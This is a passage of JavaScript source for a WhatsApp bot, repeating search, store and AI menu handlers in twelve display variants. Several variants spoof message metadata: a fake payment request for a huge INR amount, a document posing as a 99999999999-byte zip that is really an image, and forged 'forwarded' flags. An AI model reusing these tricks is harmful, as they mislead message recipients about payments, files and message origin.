          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'searchmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${searchmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'storemenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${storemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'aimenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
